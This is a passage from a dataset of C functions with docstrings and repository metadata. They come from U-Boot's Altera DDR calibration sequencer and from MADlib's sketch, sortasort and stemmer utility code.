*/\n\t\tif (i == 0)\n\t\t\tscc_mgr_set_hhp_extras();\n\n\t\tscc_set_bypass_mode(i);\n\t}\n\n\t/* Calibration is skipped. */\n\tif ((dyn_calib_steps & CALIB_SKIP_ALL) == CALIB_SKIP_ALL) {\n\t\t/*\n\t\t * Set VFIFO and LFIFO to instant-on settings in skip\n\t\t * calibration mode.\n\t\t */\n\t\tmem_skip_calibrate();\n\n\t\t/*\n\t\t * Do not remove this line as it makes sure all of our\n\t\t * decisions have been applied.\n\t\t */\n\t\twritel(0, &sdr_scc_mgr->update);\n\t\treturn 1;\n\t}\n\n\t/* Calibration is not skipped. */\n\tfor (i = 0; i < NUM_CALIB_REPEAT; i++) {\n\t\t/*\n\t\t * Zero all delay chain/phase settings for all\n\t\t * groups and all shadow register sets.\n\t\t */\n\t\tscc_mgr_zero_all();\n\n\t\trun_groups = ~0;\n\n\t\tfor (write_group = 0, write_test_bgn = 0; write_group\n\t\t\t< rwcfg->mem_if_write_dqs_width; write_group++,\n\t\t\twrite_test_bgn += rwcfg->mem_dq_per_write_dqs) {\n\t\t\t/* Initialize the group failure */\n\t\t\tgroup_failed = 0;\n\n\t\t\tcurrent_run = run_groups & ((1 <<\n\t\t\t\tRW_MGR_NUM_DQS_PER_WRITE_GROUP) - 1);\n\t\t\trun_groups = run_groups >>\n\t\t\t\tRW_MGR_NUM_DQS_PER_WRITE_GROUP;\n\n\t\t\tif (current_run == 0)\n\t\t\t\tcontinue;\n\n\t\t\twritel(write_group, SDR_PHYGRP_SCCGRP_ADDRESS |\n\t\t\t\t\t    SCC_MGR_GROUP_COUNTER_OFFSET);\n\t\t\tscc_mgr_zero_group(write_group, 0);\n\n\t\t\tfor (read_group = write_group * rwdqs_ratio,\n\t\t\t     read_test_bgn = 0;\n\t\t\t     read_group < (write_group + 1) * rwdqs_ratio;\n\t\t\t     read_group++,\n\t\t\t     read_test_bgn += rwcfg->mem_dq_per_read_dqs) {\n\t\t\t\tif (STATIC_CALIB_STEPS & CALIB_SKIP_VFIFO)\n\t\t\t\t\tcontinue;\n\n\t\t\t\t/* Calibrate the VFIFO */\n\t\t\t\tif (rw_mgr_mem_calibrate_vfifo(read_group,\n\t\t\t\t\t\t\t       read_test_bgn))\n\t\t\t\t\tcontinue;\n\n\t\t\t\tif (!(gbl->phy_debug_mode_flags &\n\t\t\t\t      PHY_DEBUG_SWEEP_ALL_GROUPS))\n\t\t\t\t\treturn 0;\n\n\t\t\t\t/* The group failed, we're done. */\n\t\t\t\tgoto grp_failed;\n\t\t\t}\n\n\t\t\t/* Calibrate the output side */\n\t\t\tfor (rank_bgn = 0, sr = 0;\n\t\t\t     rank_bgn < rwcfg->mem_number_of_ranks;\n\t\t\t     rank_bgn += NUM_RANKS_PER_SHADOW_REG, sr++) {\n\t\t\t\tif (STATIC_CALIB_STEPS & CALIB_SKIP_WRITES)\n\t\t\t\t\tcontinue;\n\n\t\t\t\t/* Not needed in quick mode! */\n\t\t\t\tif (STATIC_CALIB_STEPS &\n\t\t\t\t    CALIB_SKIP_DELAY_SWEEPS)\n\t\t\t\t\tcontinue;\n\n\t\t\t\t/* Calibrate WRITEs */\n\t\t\t\tif (!rw_mgr_mem_calibrate_writes(rank_bgn,\n\t\t\t\t\t\t\t\t write_group,\n\t\t\t\t\t\t\t\t write_test_bgn))\n\t\t\t\t\tcontinue;\n\n\t\t\t\tgroup_failed = 1;\n\t\t\t\tif (!(gbl->phy_debug_mode_flags &\n\t\t\t\t      PHY_DEBUG_SWEEP_ALL_GROUPS))\n\t\t\t\t\treturn 0;\n\t\t\t}\n\n\t\t\t/* Some group failed, we're done. */\n\t\t\tif (group_failed)\n\t\t\t\tgoto grp_failed;\n\n\t\t\tfor (read_group = write_group * rwdqs_ratio,\n\t\t\t     read_test_bgn = 0;\n\t\t\t     read_group < (write_group + 1) * rwdqs_ratio;\n\t\t\t     read_group++,\n\t\t\t     read_test_bgn += rwcfg->mem_dq_per_read_dqs) {\n\t\t\t\tif (STATIC_CALIB_STEPS & CALIB_SKIP_WRITES)\n\t\t\t\t\tcontinue;\n\n\t\t\t\tif (!rw_mgr_mem_calibrate_vfifo_end(read_group,\n\t\t\t\t\t\t\t\t    read_test_bgn))\n\t\t\t\t\tcontinue;\n\n\t\t\t\tif (!(gbl->phy_debug_mode_flags &\n\t\t\t\t      PHY_DEBUG_SWEEP_ALL_GROUPS))\n\t\t\t\t\treturn 0;\n\n\t\t\t\t/* The group failed, we're done. */\n\t\t\t\tgoto grp_failed;\n\t\t\t}\n\n\t\t\t/* No group failed, continue as usual. */\n\t\t\tcontinue;\n\ngrp_failed:\t\t/* A group failed, increment the counter. */\n\t\t\tfailing_groups++;\n\t\t}\n\n\t\t/*\n\t\t * USER If there are any failing groups then report\n\t\t * the failure.\n\t\t */\n\t\tif (failing_groups != 0)\n\t\t\treturn 0;\n\n\t\tif (STATIC_CALIB_STEPS & CALIB_SKIP_LFIFO)\n\t\t\tcontinue;\n\n\t\t/* Calibrate the LFIFO */\n\t\tif (!rw_mgr_mem_calibrate_lfifo())\n\t\t\treturn 0;\n\t}\n\n\t/*\n\t * Do not remove this line as it makes sure all of our decisions\n\t * have been applied.\n\t */\n\twritel(0, &sdr_scc_mgr->update);\n\treturn 1;\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * set_rank_and_odt_mask() - Set Rank and ODT mask\n * @rank:\tRank mask\n * @odt_mode:\tODT mode, OFF or READ_WRITE\n *\n * Set Rank and ODT mask (On-Die Termination).\n */\n", "func_signal": "static void set_rank_and_odt_mask(const u32 rank, const u32 odt_mode)", "code": "{\n\tu32 odt_mask_0 = 0;\n\tu32 odt_mask_1 = 0;\n\tu32 cs_and_odt_mask;\n\n\tif (odt_mode == RW_MGR_ODT_MODE_OFF) {\n\t\todt_mask_0 = 0x0;\n\t\todt_mask_1 = 0x0;\n\t} else {\t/* RW_MGR_ODT_MODE_READ_WRITE */\n\t\tswitch (rwcfg->mem_number_of_ranks) {\n\t\tcase 1:\t/* 1 Rank */\n\t\t\t/* Read: ODT = 0 ; Write: ODT = 1 */\n\t\t\todt_mask_0 = 0x0;\n\t\t\todt_mask_1 = 0x1;\n\t\t\tbreak;\n\t\tcase 2:\t/* 2 Ranks */\n\t\t\tif (rwcfg->mem_number_of_cs_per_dimm == 1) {\n\t\t\t\t/*\n\t\t\t\t * - Dual-Slot , Single-Rank (1 CS per DIMM)\n\t\t\t\t *   OR\n\t\t\t\t * - RDIMM, 4 total CS (2 CS per DIMM, 2 DIMM)\n\t\t\t\t *\n\t\t\t\t * Since MEM_NUMBER_OF_RANKS is 2, they\n\t\t\t\t * are both single rank with 2 CS each\n\t\t\t\t * (special for RDIMM).\n\t\t\t\t *\n\t\t\t\t * Read: Turn on ODT on the opposite rank\n\t\t\t\t * Write: Turn on ODT on all ranks\n\t\t\t\t */\n\t\t\t\todt_mask_0 = 0x3 & ~(1 << rank);\n\t\t\t\todt_mask_1 = 0x3;\n\t\t\t} else {\n\t\t\t\t/*\n\t\t\t\t * - Single-Slot , Dual-Rank (2 CS per DIMM)\n\t\t\t\t *\n\t\t\t\t * Read: Turn on ODT off on all ranks\n\t\t\t\t * Write: Turn on ODT on active rank\n\t\t\t\t */\n\t\t\t\todt_mask_0 = 0x0;\n\t\t\t\todt_mask_1 = 0x3 & (1 << rank);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 4:\t/* 4 Ranks */\n\t\t\t/* Read:\n\t\t\t * ----------+-----------------------+\n\t\t\t *           |         ODT           |\n\t\t\t * Read From +-----------------------+\n\t\t\t *   Rank    |  3  |  2  |  1  |  0  |\n\t\t\t * ----------+-----+-----+-----+-----+\n\t\t\t *     0     |  0  |  1  |  0  |  0  |\n\t\t\t *     1     |  1  |  0  |  0  |  0  |\n\t\t\t *     2     |  0  |  0  |  0  |  1  |\n\t\t\t *     3     |  0  |  0  |  1  |  0  |\n\t\t\t * ----------+-----+-----+-----+-----+\n\t\t\t *\n\t\t\t * Write:\n\t\t\t * ----------+-----------------------+\n\t\t\t *           |         ODT           |\n\t\t\t * Write To  +-----------------------+\n\t\t\t *   Rank    |  3  |  2  |  1  |  0  |\n\t\t\t * ----------+-----+-----+-----+-----+\n\t\t\t *     0     |  0  |  1  |  0  |  1  |\n\t\t\t *     1     |  1  |  0  |  1  |  0  |\n\t\t\t *     2     |  0  |  1  |  0  |  1  |\n\t\t\t *     3     |  1  |  0  |  1  |  0  |\n\t\t\t * ----------+-----+-----+-----+-----+\n\t\t\t */\n\t\t\tswitch (rank) {\n\t\t\tcase 0:\n\t\t\t\todt_mask_0 = 0x4;\n\t\t\t\todt_mask_1 = 0x5;\n\t\t\t\tbreak;\n\t\t\tcase 1:\n\t\t\t\todt_mask_0 = 0x8;\n\t\t\t\todt_mask_1 = 0xA;\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\todt_mask_0 = 0x1;\n\t\t\t\todt_mask_1 = 0x5;\n\t\t\t\tbreak;\n\t\t\tcase 3:\n\t\t\t\todt_mask_0 = 0x2;\n\t\t\t\todt_mask_1 = 0xA;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tcs_and_odt_mask = (0xFF & ~(1 << rank)) |\n\t\t\t  ((0xFF & odt_mask_0) << 8) |\n\t\t\t  ((0xFF & odt_mask_1) << 16);\n\twritel(cs_and_odt_mask, SDR_PHYGRP_RWMGRGRP_ADDRESS |\n\t\t\t\tRW_MGR_SET_CS_AND_ODT_MASK_OFFSET);\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/*\n * rw_mgr_mem_calibrate_writes_center() - Center all windows\n * @rank_bgn:\t\tRank number\n * @write_group:\tWrite group\n * @test_bgn:\t\tRank at which the test begins\n *\n * Center all windows. Do per-bit-deskew to possibly increase size of\n * certain windows.\n */\n", "func_signal": "static int\nrw_mgr_mem_calibrate_writes_center(const u32 rank_bgn, const u32 write_group,\n\t\t\t\t   const u32 test_bgn)", "code": "{\n\tint i;\n\tu32 sticky_bit_chk;\n\tu32 min_index;\n\tint left_edge[rwcfg->mem_dq_per_write_dqs];\n\tint right_edge[rwcfg->mem_dq_per_write_dqs];\n\tint mid;\n\tint mid_min, orig_mid_min;\n\tint new_dqs, start_dqs;\n\tint dq_margin, dqs_margin, dm_margin;\n\tint bgn_curr = iocfg->io_out1_delay_max + 1;\n\tint end_curr = iocfg->io_out1_delay_max + 1;\n\tint bgn_best = iocfg->io_out1_delay_max + 1;\n\tint end_best = iocfg->io_out1_delay_max + 1;\n\tint win_best = 0;\n\n\tint ret;\n\n\tdebug(\"%s:%d %u %u\", __func__, __LINE__, write_group, test_bgn);\n\n\tdm_margin = 0;\n\n\tstart_dqs = readl((SDR_PHYGRP_SCCGRP_ADDRESS |\n\t\t\t  SCC_MGR_IO_OUT1_DELAY_OFFSET) +\n\t\t\t  (rwcfg->mem_dq_per_write_dqs << 2));\n\n\t/* Per-bit deskew. */\n\n\t/*\n\t * Set the left and right edge of each bit to an illegal value.\n\t * Use (iocfg->io_out1_delay_max + 1) as an illegal value.\n\t */\n\tsticky_bit_chk = 0;\n\tfor (i = 0; i < rwcfg->mem_dq_per_write_dqs; i++) {\n\t\tleft_edge[i]  = iocfg->io_out1_delay_max + 1;\n\t\tright_edge[i] = iocfg->io_out1_delay_max + 1;\n\t}\n\n\t/* Search for the left edge of the window for each bit. */\n\tsearch_left_edge(1, rank_bgn, write_group, 0, test_bgn,\n\t\t\t &sticky_bit_chk,\n\t\t\t left_edge, right_edge, 0);\n\n\t/* Search for the right edge of the window for each bit. */\n\tret = search_right_edge(1, rank_bgn, write_group, 0,\n\t\t\t\tstart_dqs, 0,\n\t\t\t\t&sticky_bit_chk,\n\t\t\t\tleft_edge, right_edge, 0);\n\tif (ret) {\n\t\tset_failing_group_stage(test_bgn + ret - 1, CAL_STAGE_WRITES,\n\t\t\t\t\tCAL_SUBSTAGE_WRITES_CENTER);\n\t\treturn -EINVAL;\n\t}\n\n\tmin_index = get_window_mid_index(1, left_edge, right_edge, &mid_min);\n\n\t/* Determine the amount we can change DQS (which is -mid_min). */\n\torig_mid_min = mid_min;\n\tnew_dqs = start_dqs;\n\tmid_min = 0;\n\tdebug_cond(DLEVEL >= 1,\n\t\t   \"%s:%d write_center: start_dqs=%d new_dqs=%d mid_min=%d\\n\",\n\t\t   __func__, __LINE__, start_dqs, new_dqs, mid_min);\n\n\t/* Add delay to bring centre of all DQ windows to the same \"level\". */\n\tcenter_dq_windows(1, left_edge, right_edge, mid_min, orig_mid_min,\n\t\t\t  min_index, 0, &dq_margin, &dqs_margin);\n\n\t/* Move DQS */\n\tscc_mgr_apply_group_dqs_io_and_oct_out1(write_group, new_dqs);\n\twritel(0, &sdr_scc_mgr->update);\n\n\t/* Centre DM */\n\tdebug_cond(DLEVEL >= 2, \"%s:%d write_center: DM\\n\", __func__, __LINE__);\n\n\t/*\n\t * Set the left and right edge of each bit to an illegal value.\n\t * Use (iocfg->io_out1_delay_max + 1) as an illegal value.\n\t */\n\tleft_edge[0]  = iocfg->io_out1_delay_max + 1;\n\tright_edge[0] = iocfg->io_out1_delay_max + 1;\n\n\t/* Search for the/part of the window with DM shift. */\n\tsearch_window(1, rank_bgn, write_group, &bgn_curr, &end_curr,\n\t\t      &bgn_best, &end_best, &win_best, 0);\n\n\t/* Reset DM delay chains to 0. */\n\tscc_mgr_apply_group_dm_out1_delay(0);\n\n\t/*\n\t * Check to see if the current window nudges up aganist 0 delay.\n\t * If so we need to continue the search by shifting DQS otherwise DQS\n\t * search begins as a new search.\n\t */\n\tif (end_curr != 0) {\n\t\tbgn_curr = iocfg->io_out1_delay_max + 1;\n\t\tend_curr = iocfg->io_out1_delay_max + 1;\n\t}\n\n\t/* Search for the/part of the window with DQS shifts. */\n\tsearch_window(0, rank_bgn, write_group, &bgn_curr, &end_curr,\n\t\t      &bgn_best, &end_best, &win_best, new_dqs);\n\n\t/* Assign left and right edge for cal and reporting. */\n\tleft_edge[0] = -1 * bgn_best;\n\tright_edge[0] = end_best;\n\n\tdebug_cond(DLEVEL >= 2, \"%s:%d dm_calib: left=%d right=%d\\n\",\n\t\t   __func__, __LINE__, left_edge[0], right_edge[0]);\n\n\t/* Move DQS (back to orig). */\n\tscc_mgr_apply_group_dqs_io_and_oct_out1(write_group, new_dqs);\n\n\t/* Move DM */\n\n\t/* Find middle of window for the DM bit. */\n\tmid = (left_edge[0] - right_edge[0]) / 2;\n\n\t/* Only move right, since we are not moving DQS/DQ. */\n\tif (mid < 0)\n\t\tmid = 0;\n\n\t/* dm_marign should fail if we never find a window. */\n\tif (win_best == 0)\n\t\tdm_margin = -1;\n\telse\n\t\tdm_margin = left_edge[0] - mid;\n\n\tscc_mgr_apply_group_dm_out1_delay(mid);\n\twritel(0, &sdr_scc_mgr->update);\n\n\tdebug_cond(DLEVEL >= 2,\n\t\t   \"%s:%d dm_calib: left=%d right=%d mid=%d dm_margin=%d\\n\",\n\t\t   __func__, __LINE__, left_edge[0], right_edge[0],\n\t\t   mid, dm_margin);\n\t/* Export values. */\n\tgbl->fom_out += dq_margin + dqs_margin;\n\n\tdebug_cond(DLEVEL >= 2,\n\t\t   \"%s:%d write_center: dq_margin=%d dqs_margin=%d dm_margin=%d\\n\",\n\t\t   __func__, __LINE__, dq_margin, dqs_margin, dm_margin);\n\n\t/*\n\t * Do not remove this line as it makes sure all of our\n\t * decisions have been applied.\n\t */\n\twritel(0, &sdr_scc_mgr->update);\n\n\tif ((dq_margin < 0) || (dqs_margin < 0) || (dm_margin < 0))\n\t\treturn -EINVAL;\n\n\treturn 0;\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * rw_mgr_mem_calibrate_vfifo() - Calibrate the read valid prediction FIFO\n * @rw_group:\t\tRead/Write Group\n * @test_bgn:\t\tRank at which the test begins\n *\n * Stage 1: Calibrate the read valid prediction FIFO.\n *\n * This function implements UniPHY calibration Stage 1, as explained in\n * detail in Altera EMI_RM 2015.05.04 , \"UniPHY Calibration Stages\".\n *\n * - read valid prediction will consist of finding:\n *   - DQS enable phase and DQS enable delay (DQS Enable Calibration)\n *   - DQS input phase  and DQS input delay (DQ/DQS Centering)\n *  - we also do a per-bit deskew on the DQ lines.\n */\n", "func_signal": "static int rw_mgr_mem_calibrate_vfifo(const u32 rw_group, const u32 test_bgn)", "code": "{\n\tu32 p, d;\n\tu32 dtaps_per_ptap;\n\tu32 failed_substage;\n\n\tint ret;\n\n\tdebug(\"%s:%d: %u %u\\n\", __func__, __LINE__, rw_group, test_bgn);\n\n\t/* Update info for sims */\n\treg_file_set_group(rw_group);\n\treg_file_set_stage(CAL_STAGE_VFIFO);\n\treg_file_set_sub_stage(CAL_SUBSTAGE_GUARANTEED_READ);\n\n\tfailed_substage = CAL_SUBSTAGE_GUARANTEED_READ;\n\n\t/* USER Determine number of delay taps for each phase tap. */\n\tdtaps_per_ptap = DIV_ROUND_UP(iocfg->delay_per_opa_tap,\n\t\t\t\t      iocfg->delay_per_dqs_en_dchain_tap) - 1;\n\n\tfor (d = 0; d <= dtaps_per_ptap; d += 2) {\n\t\t/*\n\t\t * In RLDRAMX we may be messing the delay of pins in\n\t\t * the same write rw_group but outside of the current read\n\t\t * the rw_group, but that's ok because we haven't calibrated\n\t\t * output side yet.\n\t\t */\n\t\tif (d > 0) {\n\t\t\tscc_mgr_apply_group_all_out_delay_add_all_ranks(\n\t\t\t\t\t\t\t\trw_group, d);\n\t\t}\n\n\t\tfor (p = 0; p <= iocfg->dqdqs_out_phase_max; p++) {\n\t\t\t/* 1) Guaranteed Write */\n\t\t\tret = rw_mgr_mem_calibrate_guaranteed_write(rw_group, p);\n\t\t\tif (ret)\n\t\t\t\tbreak;\n\n\t\t\t/* 2) DQS Enable Calibration */\n\t\t\tret = rw_mgr_mem_calibrate_dqs_enable_calibration(rw_group,\n\t\t\t\t\t\t\t\t\t  test_bgn);\n\t\t\tif (ret) {\n\t\t\t\tfailed_substage = CAL_SUBSTAGE_DQS_EN_PHASE;\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\t/* 3) Centering DQ/DQS */\n\t\t\t/*\n\t\t\t * If doing read after write calibration, do not update\n\t\t\t * FOM now. Do it then.\n\t\t\t */\n\t\t\tret = rw_mgr_mem_calibrate_dq_dqs_centering(rw_group,\n\t\t\t\t\t\t\t\ttest_bgn, 1, 0);\n\t\t\tif (ret) {\n\t\t\t\tfailed_substage = CAL_SUBSTAGE_VFIFO_CENTER;\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\t/* All done. */\n\t\t\tgoto cal_done_ok;\n\t\t}\n\t}\n\n\t/* Calibration Stage 1 failed. */\n\tset_failing_group_stage(rw_group, CAL_STAGE_VFIFO, failed_substage);\n\treturn 0;\n\n\t/* Calibration Stage 1 completed OK. */\ncal_done_ok:\n\t/*\n\t * Reset the delay chains back to zero if they have moved > 1\n\t * (check for > 1 because loop will increase d even when pass in\n\t * first case).\n\t */\n\tif (d > 2)\n\t\tscc_mgr_zero_group(rw_group, 1);\n\n\treturn 1;\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/*!\n * insert a value at position i of the mfv sketch\n *\n * we do not overwrite the previous value at position i.\n * instead we place the new value at the next_offset.\n *\n * <i>Note: we do not currently garbage collection the old value's storage.\n * This wastes space, with the worst-case scenario being a column with values\n * of increasing size and frequency!</i>\n *\n * \\param transblob the transition value packed into a bytea\n * \\param dat the value to be inserted\n * \\param i the position to insert at\n */\n", "func_signal": "bytea *mfv_transval_insert_at(bytea *transblob, Datum dat, uint32 i)", "code": "{\n    mfvtransval *transval = (mfvtransval *)VARDATA(transblob);\n    bytea *      tmpblob;\n    size_t       datumLen = ExtractDatumLen(dat, transval->typLen, transval->typByVal, -1);\n\n    if (i > transval->next_mfv)\n        elog(\n            ERROR,\n            \"attempt to insert frequent value at illegal index %d in mfv sketch\",\n            i);\n    if (MFV_TRANSVAL_CAPACITY(transblob) < datumLen) {\n        /* allocate a copy with room for this, and double the current space for values */\n        size_t curspace = VARSIZE(transblob) - transval->mfvs[0].offset -\n                          VARHDRSZ;\n        tmpblob = (bytea *)palloc0(VARSIZE(transblob) + curspace + datumLen);\n        memmove(tmpblob, transblob, VARSIZE(transblob));\n        SET_VARSIZE(tmpblob, VARSIZE(transblob) + curspace + datumLen);\n        /*\n         * PG won't let us pfree the old transblob\n         * pfree(transblob);\n         */\n        transblob = tmpblob;\n        transval = (mfvtransval *)VARDATA(transblob);\n    }\n    transval->mfvs[i].offset = transval->next_offset;\n    mfv_copy_datum(transblob, i, dat);\n\n    transval->next_offset += datumLen;\n\n    return(transblob);\n}", "path": "methods\\sketch\\src\\pg_gp\\mfvsketch.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/* Increase the size of the buffer pointed to by p to at least n symbols.\n * If insufficient memory, returns NULL and frees the old buffer.\n */\n", "func_signal": "static symbol * increase_size(symbol * p, int n)", "code": "{\n    symbol * q;\n    int new_size = n + 20;\n    void * mem = realloc((char *) p - HEAD,\n                         HEAD + (new_size + 1) * sizeof(symbol));\n    if (mem == NULL) {\n        lose_s(p);\n        return NULL;\n    }\n    q = (symbol *) (HEAD + (char *)mem);\n    CAPACITY(q) = new_size;\n    return q;\n}", "path": "src\\libstemmer\\runtime\\utilities.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/*\n * get the ith item stored in sortasort\n */\n", "func_signal": "char *sortasort_getval(sortasort *s, unsigned i)", "code": "{\n    char *data_ptr = SORTASORT_DATA(s);\n    char *res = NULL;\n    Datum dat;\n    if (i >= s->num_vals) {\n        elog(ERROR, \"attempt to get item at illegal index %d in sortasort\", i);\n    }\n    if (s->dir[i] >= s->storage_sz) {\n        elog(ERROR, \"illegal offset %u in sortasort\", s->dir[i]);\n    }\n    res = data_ptr + s->dir[i];\n    dat = PointerExtractDatum(res, s->typByVal);\n    if (s->dir[i]\n        + ExtractDatumLen(dat, s->typLen, s->typByVal, s->storage_sz - s->dir[i])\n        > s->storage_sz) {\n        elog(ERROR, \"value overruns size of sortasort\");\n    }\n\n    return res;\n}", "path": "methods\\sketch\\src\\pg_gp\\sortasort.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/* check whether the content in the given bytea is safe for mfvtransval */\n", "func_signal": "void check_mfvtransval(bytea *storage)", "code": "{\n    size_t left_len = VARSIZE(storage);\n    Oid     outFuncOid;\n    bool    typIsVarLen;\n\n    mfvtransval *mfv  = NULL;\n\n    if (left_len < VARHDRSZ + sizeof(mfvtransval)) {\n        elog(ERROR, \"invalid transition state for mfvsketch\");\n    }\n    mfv = (mfvtransval*)VARDATA(storage);\n    left_len -= VARHDRSZ + sizeof(mfvtransval);\n\n    if (mfv->next_mfv > mfv->max_mfvs) {\n        elog(ERROR, \"invalid transition state for mfvsketch\");\n    }\n\n    if (mfv->next_offset + VARHDRSZ > VARSIZE(storage)) {\n        elog(ERROR, \"invalid transition state for mfvsketch\");\n    }\n\n    if (InvalidOid == mfv->typOid) {\n        elog(ERROR, \"invalid transition state for mfvsketch\");\n    }\n\n    getTypeOutputInfo(mfv->typOid, &outFuncOid, &typIsVarLen);\n    if (mfv->outFuncOid != outFuncOid\n        || mfv->typLen != get_typlen(mfv->typOid)\n        || mfv->typByVal != get_typbyval(mfv->typOid)) {\n        elog(ERROR, \"invalid transition state for mfvsketch\");\n    }\n\n    if (left_len < sizeof(offsetcnt)*mfv->max_mfvs) {\n        elog(ERROR, \"invalid transition state for mfvsketch\");\n    }\n}", "path": "methods\\sketch\\src\\pg_gp\\mfvsketch.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/*!\n * insert a new element into s_in if there's room and return TRUE\n * if not enough room, return FALSE\n * \\param s_in a sortasort\n * \\param dat a Datum to insert\n * \\param len the Postgres typLen\n */\n", "func_signal": "int sortasort_try_insert(sortasort *s_in, Datum dat, int len)", "code": "{\n    /* sanity check */\n    void *datp = DatumExtractPointer(dat, s_in->typByVal);\n\n    /* first check to see if the element is already there */\n    int found = sortasort_find(s_in, dat);\n    if (found >= 0 && found < (int)s_in->num_vals) {\n        /* found!  just return TRUE */\n        return TRUE;\n    }\n\n    len = ExtractDatumLen(dat, len, s_in->typByVal, -1);\n\n    /* sanity check */\n    if (found < -1 || found >= (int) s_in->num_vals)\n        elog(ERROR,\n             \"invalid offset %d returned by sortasort_find\",\n             found);\n\n    /* we need to insert v.  return FALSE if not enough space. */\n    if (s_in->storage_cur + len >= s_in->storage_sz) {\n        /* caller will have to allocate a bigger one and try again */\n        return FALSE;\n    }\n\n    /* return -1 if no more capacity */\n    if (s_in->num_vals >= s_in->capacity)\n        return -1;\n\n    /*\n     * copy dat to the current storage offset, put a pointer into dir,\n     * update num_vals and storage_cur\n     */\n    memcpy(SORTASORT_DATA(s_in) + s_in->storage_cur,\n           datp,\n           len);\n    s_in->dir[s_in->num_vals++] = s_in->storage_cur;\n    s_in->storage_cur += len;\n    if (s_in->storage_cur > s_in->storage_sz)\n        elog(ERROR, \"went off the end of sortasort storage\");\n\n    /* re-sort every SORTA_SLOP vals */\n    if (s_in->num_vals % SORTA_SLOP == 0)\n        qsort_arg(s_in->dir,\n                  s_in->num_vals,\n                  sizeof(s_in->dir[0]),\n                  sorta_cmp,\n                  (void *)s_in);\n\n    return TRUE;\n}", "path": "methods\\sketch\\src\\pg_gp\\sortasort.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/*\n * @brief Cast a value to text. On some databases, there\n *        are no such casts for certain data types, such as\n *        the cast for bit to text. \n *\n * @param value   The value with any specific type\n *\n * @note This is a strict function.\n *\n */\n", "func_signal": "Datum\n__to_text(PG_FUNCTION_ARGS)", "code": "{\n    Datum   value            = PG_GETARG_DATUM(0);\n    Oid     valtype          = get_fn_expr_argtype(fcinfo->flinfo, 0);\n    Oid\t\ttypoutput        = 0;\n    bool    typIsVarlena     = 0;\n    char   *result           = NULL;\n\n    getTypeOutputInfo(valtype, &typoutput, &typIsVarlena);\n\n    // call the output function of the type to convert \n    result = OidOutputFunctionCall(typoutput, value);\n\n    PG_RETURN_TEXT_P(cstring_to_text(result));\n}", "path": "methods\\utils\\src\\pg_gp\\to_char.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/*!\n * insert a value into the mfvsketch\n * \\param transblob the transition value packed into a bytea\n * \\param dat the value to be inserted\n */\n", "func_signal": "bytea *mfv_transval_append(bytea *transblob, Datum dat)", "code": "{\n    mfvtransval *transval = (mfvtransval *)VARDATA(transblob);\n    bytea *      retval;\n\n    if (transval->next_mfv == transval->max_mfvs) {\n        elog(ERROR, \"attempt to append to a full mfv sketch\");\n    }\n    retval = mfv_transval_insert_at(transblob,\n                                    dat,\n                                    transval->next_mfv);\n    (((mfvtransval *)VARDATA(retval))->next_mfv)++;\n\n    return(retval);\n}", "path": "methods\\sketch\\src\\pg_gp\\mfvsketch.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/* Code for character groupings: non-utf8 cases */\n", "func_signal": "extern int in_grouping(struct SN_env * z, const unsigned char * s, int min, int max, int repeat)", "code": "{\n    do {\n\tint ch;\n\tif (z->c >= z->l) return -1;\n\tch = z->p[z->c];\n\tif (ch > max || (ch -= min) < 0 || (s[ch >> 3] & (0X1 << (ch & 0X7))) == 0)\n\t    return 1;\n\tz->c++;\n    } while (repeat);\n    return 0;\n}", "path": "src\\libstemmer\\runtime\\utilities.c", "repo_name": "madlib/archived_madlib", "stars": 511, "license": "apache-2.0", "language": "c", "size": 20169}
{"docstring": "/*!\n * find items in a sortasort.  this involves binary search in the sorted prefix,\n * and linear search in the <SORTA_SLOP-sized suffix.\n * We assume that the sorted prefix is the\n * highest multiple of SORTA_SLOP less than s->num_vals\n *\n * \\param s a sortasort\n * \\param v a value to find\n * \\return position in directory where item found, or -1 if not found.\n * NOTE: return value 0 does not mean false!!  It means it *found* the item\n *       at position 0\n */\n", "func_signal": "int sortasort_find(sortasort *s, Datum dat)", "code": "{\n    int    theguess, diff;\n    int    hi = (s->num_vals/SORTA_SLOP)*SORTA_SLOP;\n    int    themin = 0, themax = hi - 1;\n    size_t i;\n    int    addend, subtrahend;\n    size_t len = ExtractDatumLen(dat, s->typLen, s->typByVal, -1);\n\n    /* binary search on the front of the sortasort */\n    if (themax >= (int)s->num_vals) {\n        elog(ERROR,\n             \"sortasort failure: max = %d, num_vals = %zu\",\n             themax,\n             s->num_vals);\n    }\n    theguess = hi / 2;\n    while (themin < themax ) {\n        if (!(diff = memcmp(sortasort_getval(s,theguess),\n                            DatumExtractPointer(dat, s->typByVal),\n                            len)))\n            return theguess;\n        if (themin == themax - 1) break;\n        else if (diff < 0) {\n            /* undershot */\n            addend = (themax - theguess) / 2;\n            if (!addend) addend = 1;\n            themin 